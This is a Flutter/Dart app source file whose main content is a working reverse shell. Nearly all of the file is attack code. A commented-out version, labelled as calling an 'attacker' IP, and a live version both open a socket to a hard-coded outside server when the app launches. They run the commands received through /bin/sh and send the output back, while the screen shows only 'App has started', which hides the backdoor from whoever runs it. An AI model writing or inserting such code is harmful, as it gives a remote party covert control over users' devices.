// import 'dart:io';
// import 'package:flutter/material.dart';

// void main() => runApp(MyApp());

// class MyApp extends StatefulWidget {
//   @override
//   _MyAppState createState() => _MyAppState();
// }

// class _MyAppState extends State<MyApp> {
//   final String serverIp = '3.1.16.19'; // Your IP attacker
//   final int serverPort = 14416; // Port Attacker

//   @override
//   void initState() {
//     super.initState();
//     _connectToServer();
//   }

//   void _connectToServer() {
//     Socket.connect(serverIp, serverPort).then((socket) {
//       print('Connection suscessful');

//       // Listen data from server
//       socket.listen(
//         (data) {
//           final command = String.fromCharCodes(data).trim();
//           print('Command Received From Server: $command');

//           // Reverse Shell
//           Process.run(command, [], runInShell: true).then((result) {
//             final output = result.stdout;
//             final error = result.stderr;
//             final exitCode = result.exitCode;

//             debugPrint('Command Output: $output');
//             debugPrint('Command Error: $error');
//             debugPrint('Command Exit Code: $exitCode');
//             socket.write(output);
//           }).catchError((error) {
//             socket.write('Error command: $error');
//           });
//         },
//         onDone: () {
//           print('Close connection with server.');
//           socket.destroy();
//         },
//         onError: (error) {
//           print('Error: $error');
//           socket.destroy();
//         },
//       );
//     }).catchError((error) {
//       print('Error connect server: $error');
//     });
//   }

//   @override
//   Widget build(BuildContext context) {
//     return MaterialApp(
//       home: Scaffold(
//         appBar: AppBar(
//           title: Text('Startup Socket Connection'),
//         ),
//         body: Center(
//           child: Text('App has started'),
//         ),
//       ),
//     );
//   }
// }


import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';

void main() => runApp(MyApp());

class MyApp extends StatefulWidget {
  @override
  _MyAppState createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  final String serverIp = '18.141.106.224'; // Server IP
  final int serverPort = 11980; // Server Port
  late Socket _socket; // Socket initialization

  @override
  void initState() {
    super.initState();
    _connectToServer();
  }

  void _connectToServer() async {
    try {
      _socket = await Socket.connect(serverIp, serverPort);
      print("Connection successful");

      // Listen for incoming data from server
      _socket.listen(
        (data) {
          final command = String.fromCharCodes(data).trim();
          print('Command received from server: $command');

          // Start shell and execute command
          Process.start('/bin/sh', ['-i']).then((process) {
            // Write the command into the shell's input
            process.stdin.writeln(command);

            // Listen to the shell's output and send it back
            process.stdout.transform(utf8.decoder).listen((output) {
              _socket.write(output);
              print('Command output: $output');
            });

            // Listen to errors, if any, and send them back
            process.stderr.transform(utf8.decoder).listen((error) {
              _socket.write('Error: $error');
              print('Command error: $error');
            });
          }).catchError((error) {
            _socket.write('Error starting process: $error');
          });
        },
        onDone: () {
          print("Connection closed by server.");
          _socket.destroy();
        },
        onError: (error) {
          print("Connection Error: $error");
          _socket.destroy();
        },
      );
    } catch (e) {
      print("Unable to connect: $e");
    }
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: Scaffold(
        appBar: AppBar(
          title: Text('Startup Socket Connection'),
        ),
        body: Center(
          child: Text('App has started'),
        ),
      ),
    );
  }
}
